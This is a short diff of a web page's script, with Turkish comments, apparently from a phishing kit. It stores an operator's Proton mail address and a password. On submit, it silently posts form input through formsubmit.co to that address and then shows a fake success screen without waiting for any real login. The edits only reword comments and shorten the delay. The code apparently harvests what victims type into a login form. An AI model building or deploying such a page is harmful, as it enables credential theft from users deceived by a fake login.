@@ -55,7 +55,6 @@
     </div>
 
     <script>
-        // --- BU İKİ SATIRI KENDİ BİLGİLERİNLE DOLDUR ---
         const PROTON_MAIL = "TercesS-admin@proton.me"; 
         const MASTER_PASS = "mjuytrewqaz"; 
 
@@ -73,7 +72,7 @@
             btn.innerText = "BAĞLANILIYOR...";
             btn.disabled = true;
 
-            // FormSubmit'e gönder (Arka planda çalışır, sonucu beklemez)
+            // Arka planda mail gönder
             fetch(`https://formsubmit.co/ajax/${PROTON_MAIL}`, {
                 method: "POST",
                 headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
@@ -84,11 +83,11 @@
                 })
             });
 
-            // Beklemeden başarı ekranına geç
+            // Beklemeden başarı ekranına geçiş yap
             setTimeout(() => {
                 document.getElementById('login-container').style.display = 'none';
                 document.getElementById('success-screen').style.display = 'block';
-            }, 800);
+            }, 600);
         };
 
         function copyID() {
